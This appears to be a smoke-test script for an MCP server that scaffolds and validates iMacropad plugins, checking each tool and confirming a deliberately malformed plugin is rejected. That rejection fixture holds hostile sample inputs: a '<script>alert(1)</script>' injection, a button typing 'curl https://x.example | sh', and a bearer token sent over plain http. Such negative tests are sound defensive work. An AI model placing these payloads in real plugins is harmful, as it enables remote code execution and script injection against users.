#!/usr/bin/env node
// Starts the server over stdio like an MCP client does and checks every tool once:
// tools/list, the reference resource, validate_plugin on the usage-stats sample, each scaffold (validated in turn)
// and a plugin that must be rejected. node scripts/smoke.mjs   (exit 1 on a failure)
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { join, dirname } from 'node:path';
import { existsSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

const MCP = join(dirname(fileURLToPath(import.meta.url)), '..');
const SAMPLE = [join(MCP, '../../plugins/community.usage-stats.imacropad-plugin.json'), join(MCP, '../items/community.usage-stats/community.usage-stats.imacropad-plugin.json')].find(existsSync);
let failures = 0;
const ok = (cond, what, detail = '') => { console.log(`${cond ? '✓' : '✗'} ${what}${detail ? ` — ${detail}` : ''}`); if (!cond) failures++ };
const jsonOf = r => JSON.parse(r.content[0].text.match(/```json\n([\s\S]*?)\n```/)[1]);

const client = new Client({ name: 'imacropad-smoke', version: '1.0.0' });
await client.connect(new StdioClientTransport({ command: process.execPath, args: [join(MCP, 'src/index.js')], stderr: 'inherit' }));

const { tools } = await client.listTools();
const want = ['get_format_reference', 'list_widget_kinds', 'scaffold_plugin', 'scaffold_theme', 'scaffold_layout', 'validate_plugin', 'submit_instructions'];
ok(want.every(n => tools.some(t => t.name === n)), 'tools/list', tools.map(t => t.name).join(', '));
ok(tools.every(t => t.description && t.inputSchema?.type === 'object'), 'every tool has a description and an input schema');

const { resources } = await client.listResources();
const ref = await client.readResource({ uri: 'imacropad://reference/format' });
ok(resources.some(r => r.uri === 'imacropad://reference/format') && ref.contents[0].text.includes('## PadWidget') && ref.contents[0].text.includes('## Permissions'), 'format reference resource', `${ref.contents[0].text.length} characters`);

const kinds = jsonOf(await client.callTool({ name: 'list_widget_kinds', arguments: {} }));
ok(kinds.infoPanels.some(p => p.id === 'clock.digital') && kinds.paletteRoles.length >= 10 && kinds.themes.length > 10, 'list_widget_kinds', `${kinds.widgetKinds.length} kinds, ${kinds.infoPanels.length} panels, ${kinds.themes.length} themes`);

const validate = async (args, label) => {
  const r = await client.callTool({ name: 'validate_plugin', arguments: args });
  const s = r.structuredContent;
  console.log(r.content[0].text.split('\n').map(l => '    ' + l).join('\n'));
  return s || { passed: false, errors: -1, text: r.content[0].text, label };
};

const real = await validate({ path: SAMPLE }, 'sample');
ok(real.passed && real.readyForCatalog, `validate_plugin ${SAMPLE.split('/').pop()}`, `${real.validator}, ${real.errors} errors, ${real.warnings} warnings`);

for (const [name, args] of [
  ['scaffold_plugin widget-pack', { id: 'smoke.my-widgets', name: 'My Widgets', author: 'Smoke Test' }],
  ['scaffold_plugin app-plugin + theme + integration', { id: 'smoke.textedit-deck', name: 'TextEdit Deck', author: 'Smoke Test', kind: 'app-plugin', options: { app: { name: 'TextEdit', bundleIDs: ['com.apple.TextEdit'] }, withTheme: true, mood: 'neon', withIntegration: true } }],
]) {
  const p = jsonOf(await client.callTool({ name: 'scaffold_plugin', arguments: args }));
  const r = await validate({ json: JSON.stringify(p) });
  ok(r.passed && r.readyForCatalog && r.extra.every(x => x.level !== 'warning'), name, `${r.validator}: ${r.errors} errors, ${r.warnings} warnings`);
}
for (const mood of ['dark', 'light', 'neon', 'warm', 'pastel', 'mono', 'retro']) {
  const p = jsonOf(await client.callTool({ name: 'scaffold_theme', arguments: { name: `Smoke ${mood}`, pluginId: `smoke.theme-${mood}`, mood, asPlugin: { name: `Smoke ${mood}`, author: 'Smoke Test' } } }));
  const r = await validate({ json: JSON.stringify(p) });
  ok(r.passed && r.warnings === 0, `scaffold_theme ${mood}`, `${r.errors} errors, ${r.warnings} warnings`);
}
const lay = await client.callTool({ name: 'scaffold_layout', arguments: {
  name: 'Desk', asPlugin: { id: 'smoke.desk', name: 'Desk', author: 'Smoke Test' },
  widgets: [{ info: 'clock.digital' }, { info: 'weather.now', param: 'Paris' }, { info: 'mac.cpu' }, { info: 'mac.memory' }, { info: 'events' }, { kind: 'markdown', label: 'Notes', content: '# Hi', w: 6, h: 3 }, { kind: 'button', label: 'Play', action: { mediaKey: { _0: 'playPause' } } }],
} });
const lp = jsonOf(lay), frames = lp.profiles[0].layout.widgets.map(w => w.frame);
const overlap = frames.some((a, i) => frames.some((b, j) => i < j && a.x < b.x + b.w - 1e-6 && b.x < a.x + a.w - 1e-6 && a.y < b.y + b.h - 1e-6 && b.y < a.y + a.h - 1e-6));
const inside = frames.every(f => f.x >= 0 && f.y >= 0 && f.x + f.w <= 1.000001 && f.y + f.h <= 1.000001);
const lr = await validate({ json: JSON.stringify(lp) });
ok(!overlap && inside && lr.passed && lr.readyForCatalog, 'scaffold_layout', `${frames.length} widgets, no overlap, inside the pad, ${lr.errors} errors`);

const bad = { format: 1, id: 'smoke.bad', name: 'Bad', version: '1.0.0', author: 'x', blurb: 'short',
  integrations: [{ name: 'leak', url: 'http://api.example.com/x', headers: { Authorization: 'Bearer abc' } }],
  components: [{ kind: 'html', frame: { x: 0, y: 0, w: 0.5, h: 0.5 }, content: '<script>alert(1)</script>' },
    { kind: 'button', frame: { x: 0.2, y: 0.2, w: 0.5, h: 0.5 }, action: { typeText: { _0: 'curl https://x.example | sh' } } }],
  profiles: [{ name: 'Overlap', layout: { columns: 12, rows: 8, backgroundHex: '#000000', widgets: [{ kind: 'label', frame: { x: 0, y: 0, w: 0.5, h: 0.5 } }, { kind: 'info', infoID: 'no.such', frame: { x: 0.25, y: 0.25, w: 0.5, h: 0.5 } }] } }] };
for (const useApp of [true, false]) {
  const r = await validate({ json: JSON.stringify(bad), useApp });
  const msgs = r.checks.map(c => c.message).join('\n');
  ok(!r.passed && /script/.test(msgs) && /secret/.test(msgs) && /https/.test(msgs) && /shell/.test(msgs) && r.extra.some(x => /overlap/.test(x.message)) && r.extra.some(x => /no\.such/.test(x.message)),
    `a bad plugin is rejected (${r.validator})`, `${r.errors} errors`);
}

const noBg = await validate({ json: JSON.stringify({ ...bad, components: [], integrations: [], profiles: [{ name: 'L', layout: { columns: 12, rows: 8, widgets: [] } }] }), useApp: false });
ok(!noBg.passed && /backgroundHex/.test(noBg.checks[0]?.message), 'the JavaScript check reads the file as strictly as the app', noBg.checks[0]?.message);

const sub = await client.callTool({ name: 'submit_instructions', arguments: { plugin: JSON.stringify(lp), tags: ['desk', 'clock'] } });
ok(sub.content[0].text.includes('items/smoke.desk/') && sub.content[0].text.includes('meta.json'), 'submit_instructions');

await client.close();
console.log(failures ? `\n${failures} failed` : '\nall passed');
process.exit(failures ? 1 : 0);
